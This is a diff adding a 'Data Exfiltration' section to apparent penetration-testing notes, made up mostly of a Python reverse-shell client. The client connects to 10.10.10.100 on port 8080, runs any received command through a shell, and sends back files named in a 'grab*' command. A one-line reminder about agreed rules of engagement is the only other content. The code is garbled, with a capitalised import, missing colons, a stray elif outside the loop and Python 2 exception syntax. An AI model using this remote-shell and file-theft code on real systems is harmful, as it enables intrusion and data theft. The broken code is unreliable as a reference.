@@ -83,8 +83,56 @@ def main():
   connect()
 main()
 
-
 6 - Data Exfiltration
+Ensure that the agreed rules of engagement are agreed with the client ahead of grabbing files
+Client Reverse Shell Syntax
+  - import Socket
+    import subprocess 
+    import os     # This is needed for file operations
+    
+    #The transfer function checks if file exists, if not it will notify else a loop is created which will run through the
+    #file and send 1kb of info and send it. Server has no idea about the end of the file so a DONE tage is added and file closed
+    def transfer(s, path):
+      if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while packet != '':
+            s.send(packet) 
+            packet = f.read(1024)
+        s.send('DONE')
+        f.close()
+      else:    #File is nonexistant
+        s.send('Unable to find file')
+   
+    def connect():
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+      s.connect(('10.10.10.100', 8080))
+      
+      while True
+        command = s.recv(1024)
+        if 'terminate' in command
+          s.close()
+          break
+    
+    # The formula used in the example is grab*<File Path>
+    # If the grab keyword is received this is an indicator to transfer files, this is split into 2 parts the second of which
+    # contains the file path and is what interests us, it will be stored in the path variable and passed to the transfer function
+    elif 'grab' in command
+      grab.path = command.split('*')
+      # Using try except to handle transfer errors
+      try 
+        transfer(s, path)
+      except Exception, e:
+        s.send(str(e))      # Sends the exception error
+        pass
+    else:
+      CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+      s.send( CMD.stdout.read()  ) 
+      s.send( CMD.stderr.read()  )
+
+  def main():
+    connect()
+  main()
 
 7 - Exporting To Exe
 
